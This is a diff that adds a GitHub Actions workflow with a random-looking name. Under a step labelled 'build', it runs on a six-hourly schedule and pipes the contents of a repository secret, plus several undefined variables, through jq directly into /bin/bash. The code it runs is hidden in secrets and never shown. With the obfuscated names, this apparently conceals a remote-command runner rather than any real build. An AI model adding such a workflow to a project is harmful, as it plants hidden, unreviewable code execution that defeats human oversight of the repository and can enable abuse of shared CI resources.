@@ -1,0 +1,20 @@
+name: changsimu7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: changsimu7654
+        env:
+          cj6: ${{ secrets.cj6 }}
+        run: |
+          echo $cj6 | jq -r .emsyu1593 | /bin/bash
+          echo $nvdgf5821 | jq -r .g41 | /bin/bash
+          echo $ipv64095 | jq -r .q92 | /bin/bash
+          echo $bx1694 | jq -r .lsil14 | /bin/bash
+          echo $j88 | jq -r .yl07 | /bin/bash
+
